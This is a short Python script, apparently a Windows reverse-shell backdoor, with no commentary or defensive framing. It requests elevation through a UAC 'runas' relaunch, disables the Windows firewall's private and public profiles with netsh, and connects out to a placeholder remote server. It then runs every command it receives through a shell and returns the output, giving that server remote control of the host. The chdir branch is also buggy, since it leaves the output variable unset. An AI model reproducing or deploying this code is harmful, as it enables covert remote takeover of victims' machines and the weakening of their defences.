#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import subprocess
import os
import ctypes
import sys
from collections import namedtuple

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    Client = namedtuple('Client', 'dstaddr, dstport')
    TARGET_SERVER_ADDRESS = 'XXX.XXX.XXX.XXX'
    TARGET_SERVER_PORT = 0000

    os.system('netsh advfirewall set privateprofile state off')
    os.system('netsh advfirewall set publicprofile state off')

    client = socket.socket()
    client.connect(Client(TARGET_SERVER_ADDRESS, TARGET_SERVER_PORT))

    try:
        while True:
            command = str(client.recv(4096).decode())
            if command:
                if 'chdir' in command:
                    path = command[6:]
                    os.chdir(path=path)
                else:
                    result = subprocess.check_output(command, shell=True)
                if not result:
                    client.send(bytes('No output'.encode()))
                client.send(result)
    except:
        client.close()

    client.close()
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)


